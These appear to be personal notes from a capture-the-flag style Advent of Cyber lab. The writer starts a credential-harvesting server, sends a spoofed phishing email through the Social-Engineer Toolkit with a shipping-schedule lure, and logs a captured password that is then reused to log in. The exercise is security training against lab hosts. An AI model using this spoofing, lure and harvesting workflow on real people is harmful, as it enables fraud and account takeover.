
AttackBox at `~/Rooms/AoC2025/Day02`
`./server.py`

```sh
root@ip-10-80-84-211:~# cd ~/Rooms/A
ADEnumeration/ AoC2023/       AoC2024/       AoC2025/       AoC3/
root@ip-10-80-84-211:~# cd ~/Rooms/A
ADEnumeration/ AoC2023/       AoC2024/       AoC2025/       AoC3/
root@ip-10-80-84-211:~# cd ~/Rooms/AoC2025
root@ip-10-80-84-211:~/Rooms/AoC2025# ls -la
total 16
drwxr-xr-x  4 root root 4096 Dec  2 11:13 .
drwxr-xr-x 42 root root 4096 Nov 27 09:00 ..
drwxr-xr-x  2 root root 4096 Nov 27 09:51 Day02
drwxr-xr-x  2 root root 4096 Nov 27 09:28 Day21
root@ip-10-80-84-211:~/Rooms/AoC2025# cd Day02
root@ip-10-80-84-211:~/Rooms/AoC2025/Day02# ls -la
total 20
drwxr-xr-x 2 root root 4096 Nov 27 09:51 .
drwxr-xr-x 4 root root 4096 Dec  2 11:13 ..
-rw-r--r-- 1 root root 6938 Nov 27 09:51 index.html
-rwxr-xr-x 1 root root 1920 Nov 27 09:51 server.py
root@ip-10-80-84-211:~/Rooms/AoC2025/Day02# ./server.py 
Starting server on http://0.0.0.0:8000

```

![[Images/Pasted image 20251203200528.png]]


include in email:
`http://10.80.84.211:8000`

use to create and sent phishing email:
`setoolkit`

```sh
              ________________________
              __  ___/__  ____/__  __/
              _____ \__  __/  __  /
              ____/ /_  /___  _  /
              /____/ /_____/  /_/     

[---]        The Social-Engineer Toolkit (SET)         [---]
[---]        Created by: David Kennedy (ReL1K)         [---]
                      Version: 8.0.3
                    Codename: 'Maverick'
[---]        Follow us on Twitter: @TrustedSec         [---]
[---]        Follow me on Twitter: @HackingDave        [---]
[---]       Homepage: https://www.trustedsec.com       [---]
        Welcome to the Social-Engineer Toolkit (SET).
         The one stop shop for all of your SE needs.

   The Social-Engineer Toolkit is a product of TrustedSec.

           Visit: https://www.trustedsec.com

   It's easy to update using the PenTesters Framework! (PTF)
Visit https://github.com/trustedsec/ptf to update all your tools!


 Select from the menu:

   1) Spear-Phishing Attack Vectors
   2) Website Attack Vectors
   3) Infectious Media Generator
   4) Create a Payload and Listener
   5) Mass Mailer Attack
   6) Arduino-Based Attack Vector
   7) Wireless Access Point Attack Vector
   8) QRCode Generator Attack Vector
   9) Powershell Attack Vectors
  10) Third Party Modules

  11) Return back to the main menu.

set> 5

   Social Engineer Toolkit Mass E-Mailer

   There are two options on the mass e-mailer, the first would
   be to send an email to one individual person. The second option
   will allow you to import a list and send it to as many people as
   you want within that list.

   What do you want to do:

    1.  E-Mail Attack Single Email Address
    2.  E-Mail Attack Mass Mailer

    3. Return to main menu.
   
set:mailer>1
set:phishing> Send email to:factory@wareville.thm

  1. Use a gmail Account for your email attack.
  2. Use your own server or open relay

set:phishing>2
set:phishing> From address (ex: moo@example.com):updates@flyingdeer.thm
set:phishing> The FROM NAME the user will see:Flying Deer
set:phishing> Username for open-relay [blank]:
Password for open-relay [blank]: 
set:phishing> SMTP email server address (ex. smtp.youremailserveryouown.com):10.80.164.177
set:phishing> Port number for the SMTP server [25]:
set:phishing> Flag this message/s as high priority? [yes|no]:no
Do you want to attach a file - [y/n]: n
Do you want to attach an inline file - [y/n]: n
set:phishing> Email subject:Shipping Schedule Changes
set:phishing> Send the message as html or plain? 'h' or 'p' [p]:
[!] IMPORTANT: When finished, type END (all capital) then hit {return} on a new line.
set:phishing> Enter the body of the message, type END (capitals) when finished:Dear elves, 
Kindly note that there have been significant changes to the shipping schedules due to increased shipping orders.
Please confirm the new schedule by visiting http://10.80.84.211:8000
Best regards,
Flying Deer
ENDNext line of the body: Next line of the body: Next line of the body: Next line of the body: Next line of the body: 
[*] SET has finished sending the emails

      Press <return> to continue

```


```sh
10.80.164.177 - - [03/Dec/2025 18:12:02] "GET / HTTP/1.1" 200 -
[2025-12-03 18:12:02] Captured -> username: admin    password: unranked-wisdom-anthem    from: 10.80.164.177
10.80.164.177 - - [03/Dec/2025 18:12:02] "POST /submit HTTP/1.1" 303 -
10.80.164.177 - - [03/Dec/2025 18:12:02] "GET / HTTP/1.1" 200 -
```

We could log into the below site using the `factory` user and the above password

![[Images/Pasted image 20251203200704.png]]


